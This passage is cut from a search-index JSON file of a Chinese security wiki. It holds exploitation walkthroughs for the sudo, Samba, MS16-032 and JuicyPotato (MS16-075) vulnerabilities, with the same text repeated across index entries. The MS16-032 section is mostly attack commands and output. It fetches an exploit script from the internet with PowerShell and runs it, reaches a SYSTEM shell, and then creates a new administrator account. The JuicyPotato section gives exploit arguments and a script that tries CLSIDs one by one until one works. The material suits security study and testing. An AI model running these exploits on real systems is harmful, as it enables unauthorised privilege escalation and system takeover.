\u6210\u529f\u8bfb\u53d6\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u7528vim\u6267\u884c\u5176\u4ed6\u7684\u547d\u4ee4\uff08\u4ee5root\u8eab\u4efd\uff09 *\u603b\u7ed3OR\u9884\u9632\uff1a* 1.\u4e4b\u6240\u4ee5\u4f1a\u4ea7\u751f\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u662f\u56e0\u4e3a\u5c06\u7528\u6237 ID \u8f6c\u6362\u4e3a\u7528\u6237\u540d\u7684\u51fd\u6570\u4f1a\u5c06 -1\uff08\u6216\u65e0\u6548\u7b49\u6548\u7684 4294967295\uff09\u8bef\u8ba4\u4e3a\u662f 0\uff0c\u800c\u8fd9\u6b63\u597d\u662f root \u7528\u6237 User ID 2.\u8bf7\u5c06 sudo \u5347\u7ea7\u5230 1.8.28 \u6700\u65b0\u7248\u672c\uff0c\u8be5\u6f0f\u6d1e\u4f1a\u5f71\u54cd 1.8.28 \u4e4b\u524d\u7684\u6240\u6709\u7248\u672c\u3002","title":"\uff08CVE-2019-14287\uff09sudo\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-7494\uff09Linux Samba \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c/","text":"\uff08CVE-2017-7494\uff09Linux Samba \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c CVE-2017-7494 Vulnerability reference: CVE-2016-0728 exp-db Samba Samba 3.5.0-4.6.4/4.5.10/4.4.14 Usage is_known_pipename . rb \u653e\u5728 / usr / share / metasploit - framework / modules / exploits / linux / samba / \u76ee\u5f55\u4e0b msf use exploit / linux / samba / is_known_pipename set RHOST 192 . 168 . 220 . 140 run References Samba\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2017-7494) \u3010\u6f0f\u6d1e\u5206\u6790\u3011Samba\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2017-7494)-SambaCry\u5206\u6790\u62a5\u544a Msf\u590d\u73b0Samba\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-7494","title":"\uff08CVE-2017-7494\uff09Linux Samba \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-7494\uff09Linux Samba \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c/#cve-2017-7494linux-samba","text":"CVE-2017-7494 Vulnerability reference: CVE-2016-0728 exp-db","title":"\uff08CVE-2017-7494\uff09Linux Samba \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-7494\uff09Linux Samba \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c/#samba","text":"Samba 3.5.0-4.6.4/4.5.10/4.4.14","title":"Samba"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-7494\uff09Linux Samba \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c/#usage","text":"is_known_pipename . rb \u653e\u5728 / usr / share / metasploit - framework / modules / exploits / linux / samba / \u76ee\u5f55\u4e0b msf use exploit / linux / samba / is_known_pipename set RHOST 192 . 168 . 220 . 140 run","title":"Usage"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-7494\uff09Linux Samba \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c/#references","text":"Samba\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2017-7494) \u3010\u6f0f\u6d1e\u5206\u6790\u3011Samba\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2017-7494)-SambaCry\u5206\u6790\u62a5\u544a Msf\u590d\u73b0Samba\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-7494","title":"References"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-0099\uff09\u3010MS16-32\u3011 windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/","text":"\uff08CVE-2016-0099\uff09\u3010MS16-32\u3011 windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e \u4ecb\u7ecd \u6f0f\u6d1e\u7c7b\u578b\uff1a\u7279\u6743\u63d0\u5347 Microsoft \u5b89\u5168\u516c\u544a\uff1a https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032 exploit-db\u7684\u8be6\u60c5\uff1a https://www.exploit-db.com/exploits/39574/ \u5229\u7528\u65f6\u9700\u8981\u6ee1\u8db3\u7684\u8981\u6c42 \u2460\u7cfb\u7edf\u9700\u8981\u62e5\u6709\u81f3\u5c112\u4e2a\u7684CPU\u6838\u5fc3 \u2461Power shell v2.0\u4ee5\u53ca\u66f4\u9ad8\u7684\u7248\u672c \u5f71\u54cd\u7684Windwos\u7248\u672c Windows Vista\u3001Windows 7\u3001Windows 2008 Server\u3001Windows 2012 Server\u3001Windows 8.1\u3001Windows 10 \u6f0f\u6d1e\u5229\u7528 \u811a\u672c\u5730\u5740\uff1a 1_Invoke-MS16-032.ps1 \u6d4b\u8bd5\u4e00\uff1a\u666e\u901a\u7528\u6237\u767b\u5f55\u4e0b\uff0c\u83b7\u53d6\u7ba1\u7406\u5458cmd\u521b\u5efa\u6587\u4ef6\u7684\u65b9\u6cd5\u6709\u591a\u79cd\uff0c\u8fd9\u91cc\u6f14\u793a\u4e24\u79cd\uff1a \u2460\u521b\u5efa\u6587\u4ef6 1_Invoke-MS16-032.ps1 \u5e76\u5199\u5165\u5185\u5bb9\uff1b E : \\ MS16 - 032 type nul 1 _Invoke - MS16 - 032 . ps1 E : \\ MS16 - 032 notepad 1 _Invoke - MS16 - 032 . ps1 # \u5199\u5165\u5185\u5bb9 \u6587\u4ef6\u4e0b\u8f7d\u597d\u4e4b\u540e\uff0c\u5148\u5c55\u793a\u4e00\u4e0b\u5f53\u524d\u7528\u6237\uff0c\u4ee5\u53ca\u5c5e\u7ec4 E : \\ MS16 - 032 whoami win ... \\ test E : \\ MS16 - 032 net user test \u7528\u6237\u540d test ... \u53ef\u5141\u8bb8\u7684\u767b\u5f55\u5c0f\u65f6\u6570 All \u672c\u5730\u7ec4\u6210\u5458 * Users \u5168\u5c40\u7ec4\u6210\u5458 * None \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u65e0\u6743\u7684\u4e00\u4e2a\u7528\u6237\uff0c\u73b0\u5728\u5f00\u59cb\u6267\u884c\u811a\u672c E : \\ MS16 - 032 powershell - exec bypass Windows PowerShell \u7248\u6743\u6240\u6709 ( C ) 2009 Microsoft Corporation \u3002 \u4fdd\u7559\u6240\u6709\u6743\u5229 \u3002 PS E : \\ MS16 - 032 . . \\ 1 _Invoke - MS16 - 032. ps1 PS E : \\ MS16 - 032 Invoke - MS16 - 032 __ __ ___ ___ ___ ___ ___ ___ | V | _ | _ | | _ | ___ | | _ | _ | | | _ | _ | | _ | . | ___ | | | _ | _ | | _ | _ | _ | ___ | _____ | ___ | | ___ | ___ | ___ | [ by b33f - @FuzzySec ] [ ? ] Operating system core count : 2 [ ] Duplicating CreateProcessWithLogonW handle ... [ ] Starting process race [ ! ] Holy handle leak Batman , we have a SYSTEM shell !! PS E : \\ MS16 - 032 \u524d\u9762\u7684\u6b65\u9aa4\u65f6\u8fdb\u5165powershell\u5728\u6267\u884c\u547d\u4ee4\uff0c\u4f46\u5176\u5b9e\u53ef\u4ee5\u52a0\u4e00\u4e2a -c \u53c2\u6570\uff0c\u540e\u9762\u53ef\u4ee5\u76f4\u63a5\u63a5\u547d\u4ee4\uff0c\u5206\u53f7\u5206\u9694\u5f00\uff0c\u7136\u540e\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\uff0c\u4e0d\u7528\u8fdb\u5165powershell\u3002 E : \\ MS16 - 032 powershell - exec bypass - c . .\\1_Invoke-MS16-032.ps1;Invoke-MS16-032 __ __ ___ ___ ___ ___ ___ ___ | V | _ | _ | | _ | ___ | | _ | _ | | | _ | _ | | _ | . | ___ | | | _ | _ | | _ | _ | _ | ___ | _____ | ___ | | ___ | ___ | ___ | [ by b33f - @FuzzySec ] [ ? ] Operating system core count : 2 [ ] Duplicating CreateProcessWithLogonW handle ... [ ] Starting process race [ ! ] Holy handle leak Batman , we have a SYSTEM shell !! E : \\ MS16 - 032 \u811a\u672c\u5730\u5740\uff1a 2_Invoke-MS16-032.ps1 \u6d4b\u8bd5\u4e8c\uff1a\u666e\u901a\u7528\u6237\u767b\u5f55\u4e0b\uff0c\u521b\u5efa\u5176\u4ed6\u7528\u6237\uff0c\u5e76\u52a0\u5165 administrators \u7ec4Ps\uff1a\u76f8\u5bf9\u4e8e\u6d4b\u8bd5\u4e00\u7684\u811a\u672c\uff0c\u8be5\u811a\u672c\u8fdb\u884c\u4e86\u7b80\u5355\u6539\u53d8\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7a0b\u5e8f\uff0c\u5e76\u53ef\u4ee5\u6dfb\u52a0\u53c2\u6570\u6267\u884c\uff08\u5168\u7a0b\u65e0\u5f39\u6846\uff09\u3002 -Application \u53c2\u6570\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7a0b\u5e8f E : \\ MS16 - 032 whoami win ... \\ test E : \\ MS16 - 032 net user test_test / add \u53d1\u751f\u7cfb\u7edf\u9519\u8bef 5 \u3002 \u62d2\u7edd\u8bbf\u95ee\u3002 E : \\ MS16 - 032 powershell - nop - exec bypass - c IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1 );Invoke-MS16-032 -Application cmd.exe -commandline /c net user test_test test_test /add __ __ ___ ___ ___ ___ ___ ___ | V | _ | _ | | _ | ___ | | _ | _ | | | _ | _ | | _ | . | ___ | | | _ | _ | | _ | _ | _ | ___ | _____ | ___ | | ___ | ___ | ___ | [ by b33f - @FuzzySec ] [ ? ] Operating system core count : 2 [ ] Duplicating CreateProcessWithLogonW handles .. ... [ ] Starting process race [ ! ] Holy handle leak Batman , we have a SYSTEM shell !! E : \\ MS16 - 032 net user --------------------------------------------------------------------- Administrator Guest HSW test test_test \u547d\u4ee4\u6210\u529f\u5b8c\u6210 \u3002 E : \\ MS16 - 032 net user test_test \u7528\u6237\u540d test_test ... \u672c\u5730\u7ec4\u6210\u5458 * Users \u5168\u5c40\u7ec4\u6210\u5458 * None \u547d\u4ee4\u6210\u529f\u5b8c\u6210 \u3002 \u53ef\u4ee5\u770b\u5230 test_test \u7528\u6237\u6dfb\u52a0\u5b8c\u6210\uff0c\u4f46\u662f\u53ea\u5c5e\u4e8e Users\u7ec4 \uff0c\u73b0\u5728\u5c06\u5176\u52a0\u5165 Administrators\u7ec4 \uff0c\u5148\u67e5\u770b\u4e00\u4e0b\u7ec4\u548c\u6743\u9650 E : \\ MS16 - 032 powershell - nop - exec bypass - c IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1 );Invoke-MS16-032 -Application cmd.exe -commandline /c net localgroup Administrators test_test /add __ __ ___ ___ ___ ___ ___ ___ | V | _ | _ | | _ | ___ | | _ | _ | | | _ | _ | | _ | . | ___ | | | _ | _ | | _ | _ | _ | ___ | _____ | ___ | | ___ | ___ | ___ | [ by b33f - @FuzzySec ] [ ? ] Operating system core count : 2 [ ] Duplicating CreateProcessWithLogonW handles .. ... [ ] Starting process race [ ! ] Holy handle leak Batman , we have a SYSTEM shell !! E : \\ MS16 - 032 net localgroup Administrators \u522b\u540d Administrators \u6ce8\u91ca \u7ba1\u7406\u5458\u5bf9\u8ba1\u7b97\u673a / \u57df\u6709\u4e0d\u53d7\u9650\u5236\u7684\u5b8c\u5168\u8bbf\u95ee\u6743 \u6210\u5458 --------------------------------------------- Administrator test_test \u547d\u4ee4\u6210\u529f\u5b8c\u6210 \u3002 E : \\ MS16 - 032 net user test_test \u7528\u6237\u540d test_test ... \u672c\u5730\u7ec4\u6210\u5458 * Administrators * Users \u5168\u5c40\u7ec4\u6210\u5458 * None \u547d\u4ee4\u6210\u529f\u5b8c\u6210 \u3002","title":"\uff08CVE-2016-0099\uff09\u3010MS16-32\u3011 windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-0099\uff09\u3010MS16-32\u3011 windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#cve-2016-0099ms16-32-windows","text":"","title":"\uff08CVE-2016-0099\uff09\u3010MS16-32\u3011 windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-0099\uff09\u3010MS16-32\u3011 windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_1","text":"\u6f0f\u6d1e\u7c7b\u578b\uff1a\u7279\u6743\u63d0\u5347 Microsoft \u5b89\u5168\u516c\u544a\uff1a https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032 exploit-db\u7684\u8be6\u60c5\uff1a https://www.exploit-db.com/exploits/39574/ \u5229\u7528\u65f6\u9700\u8981\u6ee1\u8db3\u7684\u8981\u6c42 \u2460\u7cfb\u7edf\u9700\u8981\u62e5\u6709\u81f3\u5c112\u4e2a\u7684CPU\u6838\u5fc3 \u2461Power shell v2.0\u4ee5\u53ca\u66f4\u9ad8\u7684\u7248\u672c \u5f71\u54cd\u7684Windwos\u7248\u672c Windows Vista\u3001Windows 7\u3001Windows 2008 Server\u3001Windows 2012 Server\u3001Windows 8.1\u3001Windows 10","title":"\u4ecb\u7ecd"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-0099\uff09\u3010MS16-32\u3011 windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_2","text":"\u811a\u672c\u5730\u5740\uff1a 1_Invoke-MS16-032.ps1 \u6d4b\u8bd5\u4e00\uff1a\u666e\u901a\u7528\u6237\u767b\u5f55\u4e0b\uff0c\u83b7\u53d6\u7ba1\u7406\u5458cmd\u521b\u5efa\u6587\u4ef6\u7684\u65b9\u6cd5\u6709\u591a\u79cd\uff0c\u8fd9\u91cc\u6f14\u793a\u4e24\u79cd\uff1a \u2460\u521b\u5efa\u6587\u4ef6 1_Invoke-MS16-032.ps1 \u5e76\u5199\u5165\u5185\u5bb9\uff1b E : \\ MS16 - 032 type nul 1 _Invoke - MS16 - 032 . ps1 E : \\ MS16 - 032 notepad 1 _Invoke - MS16 - 032 . ps1 # \u5199\u5165\u5185\u5bb9 \u6587\u4ef6\u4e0b\u8f7d\u597d\u4e4b\u540e\uff0c\u5148\u5c55\u793a\u4e00\u4e0b\u5f53\u524d\u7528\u6237\uff0c\u4ee5\u53ca\u5c5e\u7ec4 E : \\ MS16 - 032 whoami win ... \\ test E : \\ MS16 - 032 net user test \u7528\u6237\u540d test ... \u53ef\u5141\u8bb8\u7684\u767b\u5f55\u5c0f\u65f6\u6570 All \u672c\u5730\u7ec4\u6210\u5458 * Users \u5168\u5c40\u7ec4\u6210\u5458 * None \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u65e0\u6743\u7684\u4e00\u4e2a\u7528\u6237\uff0c\u73b0\u5728\u5f00\u59cb\u6267\u884c\u811a\u672c E : \\ MS16 - 032 powershell - exec bypass Windows PowerShell \u7248\u6743\u6240\u6709 ( C ) 2009 Microsoft Corporation \u3002 \u4fdd\u7559\u6240\u6709\u6743\u5229 \u3002 PS E : \\ MS16 - 032 . . \\ 1 _Invoke - MS16 - 032. ps1 PS E : \\ MS16 - 032 Invoke - MS16 - 032 __ __ ___ ___ ___ ___ ___ ___ | V | _ | _ | | _ | ___ | | _ | _ | | | _ | _ | | _ | . | ___ | | | _ | _ | | _ | _ | _ | ___ | _____ | ___ | | ___ | ___ | ___ | [ by b33f - @FuzzySec ] [ ? ] Operating system core count : 2 [ ] Duplicating CreateProcessWithLogonW handle ... [ ] Starting process race [ ! ] Holy handle leak Batman , we have a SYSTEM shell !! PS E : \\ MS16 - 032 \u524d\u9762\u7684\u6b65\u9aa4\u65f6\u8fdb\u5165powershell\u5728\u6267\u884c\u547d\u4ee4\uff0c\u4f46\u5176\u5b9e\u53ef\u4ee5\u52a0\u4e00\u4e2a -c \u53c2\u6570\uff0c\u540e\u9762\u53ef\u4ee5\u76f4\u63a5\u63a5\u547d\u4ee4\uff0c\u5206\u53f7\u5206\u9694\u5f00\uff0c\u7136\u540e\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\uff0c\u4e0d\u7528\u8fdb\u5165powershell\u3002 E : \\ MS16 - 032 powershell - exec bypass - c . .\\1_Invoke-MS16-032.ps1;Invoke-MS16-032 __ __ ___ ___ ___ ___ ___ ___ | V | _ | _ | | _ | ___ | | _ | _ | | | _ | _ | | _ | . | ___ | | | _ | _ | | _ | _ | _ | ___ | _____ | ___ | | ___ | ___ | ___ | [ by b33f - @FuzzySec ] [ ? ] Operating system core count : 2 [ ] Duplicating CreateProcessWithLogonW handle ... [ ] Starting process race [ ! ] Holy handle leak Batman , we have a SYSTEM shell !! E : \\ MS16 - 032 \u811a\u672c\u5730\u5740\uff1a 2_Invoke-MS16-032.ps1 \u6d4b\u8bd5\u4e8c\uff1a\u666e\u901a\u7528\u6237\u767b\u5f55\u4e0b\uff0c\u521b\u5efa\u5176\u4ed6\u7528\u6237\uff0c\u5e76\u52a0\u5165 administrators \u7ec4Ps\uff1a\u76f8\u5bf9\u4e8e\u6d4b\u8bd5\u4e00\u7684\u811a\u672c\uff0c\u8be5\u811a\u672c\u8fdb\u884c\u4e86\u7b80\u5355\u6539\u53d8\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7a0b\u5e8f\uff0c\u5e76\u53ef\u4ee5\u6dfb\u52a0\u53c2\u6570\u6267\u884c\uff08\u5168\u7a0b\u65e0\u5f39\u6846\uff09\u3002 -Application \u53c2\u6570\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7a0b\u5e8f E : \\ MS16 - 032 whoami win ... \\ test E : \\ MS16 - 032 net user test_test / add \u53d1\u751f\u7cfb\u7edf\u9519\u8bef 5 \u3002 \u62d2\u7edd\u8bbf\u95ee\u3002 E : \\ MS16 - 032 powershell - nop - exec bypass - c IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1 );Invoke-MS16-032 -Application cmd.exe -commandline /c net user test_test test_test /add __ __ ___ ___ ___ ___ ___ ___ | V | _ | _ | | _ | ___ | | _ | _ | | | _ | _ | | _ | . | ___ | | | _ | _ | | _ | _ | _ | ___ | _____ | ___ | | ___ | ___ | ___ | [ by b33f - @FuzzySec ] [ ? ] Operating system core count : 2 [ ] Duplicating CreateProcessWithLogonW handles .. ... [ ] Starting process race [ ! ] Holy handle leak Batman , we have a SYSTEM shell !! E : \\ MS16 - 032 net user --------------------------------------------------------------------- Administrator Guest HSW test test_test \u547d\u4ee4\u6210\u529f\u5b8c\u6210 \u3002 E : \\ MS16 - 032 net user test_test \u7528\u6237\u540d test_test ... \u672c\u5730\u7ec4\u6210\u5458 * Users \u5168\u5c40\u7ec4\u6210\u5458 * None \u547d\u4ee4\u6210\u529f\u5b8c\u6210 \u3002 \u53ef\u4ee5\u770b\u5230 test_test \u7528\u6237\u6dfb\u52a0\u5b8c\u6210\uff0c\u4f46\u662f\u53ea\u5c5e\u4e8e Users\u7ec4 \uff0c\u73b0\u5728\u5c06\u5176\u52a0\u5165 Administrators\u7ec4 \uff0c\u5148\u67e5\u770b\u4e00\u4e0b\u7ec4\u548c\u6743\u9650 E : \\ MS16 - 032 powershell - nop - exec bypass - c IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1 );Invoke-MS16-032 -Application cmd.exe -commandline /c net localgroup Administrators test_test /add __ __ ___ ___ ___ ___ ___ ___ | V | _ | _ | | _ | ___ | | _ | _ | | | _ | _ | | _ | . | ___ | | | _ | _ | | _ | _ | _ | ___ | _____ | ___ | | ___ | ___ | ___ | [ by b33f - @FuzzySec ] [ ? ] Operating system core count : 2 [ ] Duplicating CreateProcessWithLogonW handles .. ... [ ] Starting process race [ ! ] Holy handle leak Batman , we have a SYSTEM shell !! E : \\ MS16 - 032 net localgroup Administrators \u522b\u540d Administrators \u6ce8\u91ca \u7ba1\u7406\u5458\u5bf9\u8ba1\u7b97\u673a / \u57df\u6709\u4e0d\u53d7\u9650\u5236\u7684\u5b8c\u5168\u8bbf\u95ee\u6743 \u6210\u5458 --------------------------------------------- Administrator test_test \u547d\u4ee4\u6210\u529f\u5b8c\u6210 \u3002 E : \\ MS16 - 032 net user test_test \u7528\u6237\u540d test_test ... \u672c\u5730\u7ec4\u6210\u5458 * Administrators * Users \u5168\u5c40\u7ec4\u6210\u5458 * None \u547d\u4ee4\u6210\u529f\u5b8c\u6210 \u3002","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-3225\uff09\u3010MS16-075\u3011 JuicyPotato windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/","text":"\uff08CVE-2016-3225\uff09\u3010MS16-075\u3011 JuicyPotato windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e JuicyPotato\u662f\u4e00\u6b3eWindows\u63d0\u6743\u5de5\u5177\uff0c\u79f0\u4e3a\u70c2\u571f\u8c46\uff0c\u6f0f\u6d1e\u7f16\u53f7\u4e3aMS16-075 \u5b98\u65b9\u5730\u5740\uff1a https://github.com/ohpe/juicy-potato \u53c2\u6570\u7b80\u4ecb \u7b80\u5355\u5229\u7528 D : \\ JuicyPotato . exe - t t - p c : \\ windows \\ system32 \\ cmd . exe - l 1111 - c { 9 B1F122C - 2982 - 4 e91 - AA8B - E071D54F2A4D } Mandatory args : - t createprocess \u8c03\u7528 : t CreateProcessWithTokenW , u CreateProcessAsUser , * try both - p program : \u8fd0\u884c\u6307\u5b9a\u7a0b\u5e8f - l port : COM \u670d\u52a1\u5668\u4fa6\u542c\u7aef\u53e3 Optional args : - m ip : COM \u670d\u52a1\u5668\u4fa6\u542c\u5730\u5740 ( \u9ed8\u8ba4 127 . 0 . 0 . 1 ) - a argument : \u4f20\u9012\u7ed9\u7a0b\u5e8f\u547d\u4ee4\u884c\u53c2\u6570 ( \u9ed8\u8ba4 NULL ) - k ip : RPC \u670d\u52a1\u5668 IP \u5730\u5740 ( \u9ed8\u8ba4 127 . 0 . 0 . 1 ) - n port : RPC \u670d\u52a1\u5668\u4fa6\u542c\u7aef\u53e3 ( \u9ed8\u8ba4 135 ) - c { clsid } : CLSID ( default BITS : { 4991 d34b - 80 a1 - 4291 - 83 b6 - 3328366 b9097 } ) https : // github . com / ohpe / juicy - potato / tree / master / CLSID - z \u4ec5\u6d4b\u8bd5 CLSID \u5e76\u6253\u5370\u4ee4\u724c\u7684\u7528\u6237 \u53ef\u5426\u5229\u7528 1.whoami /priv \u5982\u679c\u5f00\u542fSeImpersonate\u6743\u9650\uff1a-t t \u5982\u679c\u5f00\u542fSeAssignPrimaryToken\u6743\u9650\uff1a-t u \u5982\u679c\u5747\u5f00\u542f\uff1a-t * \u5982\u679c\u5747\u672a\u5f00\u542f\uff1a\u65e0\u6cd5\u63d0\u6743 2.\u67e5\u770bRPC\u662f\u5426\u662f135 \u5982\u679c\u88ab\u4fee\u6539(\u4f8b\u5982\u4e3a111)\uff0cjuicypotato\u7684\u53c2\u6570\u53ef\u4ee5\u4f7f\u7528-n 111\u6307\u5b9aRPC\u7aef\u53e3 \u627e\u5230\u53e6\u4e00\u7cfb\u7edf\uff0c\u80fd\u591f\u4ee5\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u8fdb\u884c\u8fdc\u7a0bRPC\u767b\u5f55\uff0c\u6b64\u65f6juicypotato\u7684\u53c2\u6570\u53ef\u4ee5\u4f7f\u7528-k Windows\u9ed8\u8ba4\u914d\u7f6e\u4e0b\uff0c\u5141\u8bb8135\u7aef\u53e3\u7684\u5165\u7ad9\u89c4\u5219\u5373\u53ef\u8fdb\u884c\u8fdc\u7a0bRPC\u767b\u5f55\u3002 \u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u5141\u8bb8135\u7aef\u53e3\u5165\u7ad9\u7684\u547d\u4ee4\u5982\u4e0b\uff1a netsh advfirewall firewall add rule name=\u201c135\u201d protocol=TCP dir=in localport=135 action=allow 3.\u9009\u62e9\u53ef\u7528\u7684CLSID \u53c2\u8003\u5217\u8868\uff1a https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md \u6839\u636e\u4f60\u7684\u7cfb\u7edf\u7c7b\u578b\u9009\u62e9CLSID\uff08EG:{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}\uff09 \u7136\u540e-c\u6307\u5b9a\u5373\u53ef 4.\u9009\u62e9\u4e00\u4e2a\u7cfb\u7edf\u672a\u5360\u7528\u7684\u7aef\u53e3\u4f5c\u4e3a\u76d1\u542c\u7aef\u53e3 -l\u53c2\u6570\u6307\u5b9a\u5373\u53ef WebShell\u4f7f\u7528JuicyPotato WebShell\u56e0\u4e3a\u65e0\u6cd5\u53e6\u5916\u8c03\u7528cmd\u6240\u4ee5\u9700\u8981\u4f7f\u7528\u4fee\u6539\u8fc7\u7684JuicyPotato JuicyPotato-webshell.exe -p \u201cwhoami\u201d \u65b0\u5efa get-clid-2012.ps1 New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null $CLSID = Get-ItemProperty HKCR:\\clsid\\* | select-object AppID,@{N= CLSID ; E={$_.pschildname}} | where-object {$_.appid -ne $null} foreach($a in $CLSID) { Write-Host $a.CLSID } \u5217\u51fa\u6240\u6709CLSID\u5230 CLSID.list \u4e2d Powershell -ep bypass -f get-clid-2012.ps1 CLSID.list \u65b0\u5efa juicypotato.bat @echo off :: Starting port , you can change it set / a port = 10000 SETLOCAL ENABLEDELAYEDEXPANSION FOR / F %% i IN ( CLSID . list ) DO ( echo %% i ! port ! juicypotato - webshell . exe - c %% i - p whoami result . log set RET = ! ERRORLEVEL ! :: echo ! RET ! if !RET! == 1 set / a port = port + 1 ) \u8fd0\u884c juicypotato.bat \u968f\u540e\u6839\u636elog\u7684\u76f8\u5173\u8f93\u51fa\uff0c\u9009\u62e9\u5408\u9002\u7684CLSID\u8fdb\u884c\u6743\u9650\u63d0\u5347\u5373\u53ef http://emonsec.com/web/590.html","title":"\uff08CVE-2016-3225\uff09\u3010MS16-075\u3011 JuicyPotato windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-3225\uff09\u3010MS16-075\u3011 JuicyPotato windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#cve-2016-3225ms16-075-juicypotato-windows","text":"JuicyPotato\u662f\u4e00\u6b3eWindows\u63d0\u6743\u5de5\u5177\uff0c\u79f0\u4e3a\u70c2\u571f\u8c46\uff0c\u6f0f\u6d1e\u7f16\u53f7\u4e3aMS16-075 \u5b98\u65b9\u5730\u5740\uff1a https://github.com/ohpe/juicy-potato","title":"\uff08CVE-2016-3225\uff09\u3010MS16-075\u3011 JuicyPotato windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-3225\uff09\u3010MS16-075\u3011 JuicyPotato windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_1","text":"\u7b80\u5355\u5229\u7528 D : \\ JuicyPotato . exe - t t - p c : \\ windows \\ system32 \\ cmd . exe - l 1111 - c { 9 B1F122C - 2982 - 4 e91 - AA8B - E071D54F2A4D } Mandatory args : - t createprocess \u8c03\u7528 : t CreateProcessWithTokenW , u CreateProcessAsUser , * try both - p program : \u8fd0\u884c\u6307\u5b9a\u7a0b\u5e8f - l port : COM \u670d\u52a1\u5668\u4fa6\u542c\u7aef\u53e3 Optional args : - m ip : COM \u670d\u52a1\u5668\u4fa6\u542c\u5730\u5740 ( \u9ed8\u8ba4 127 . 0 . 0 . 1 ) - a argument : \u4f20\u9012\u7ed9\u7a0b\u5e8f\u547d\u4ee4\u884c\u53c2\u6570 ( \u9ed8\u8ba4 NULL ) - k ip : RPC \u670d\u52a1\u5668 IP \u5730\u5740 ( \u9ed8\u8ba4 127 . 0 . 0 . 1 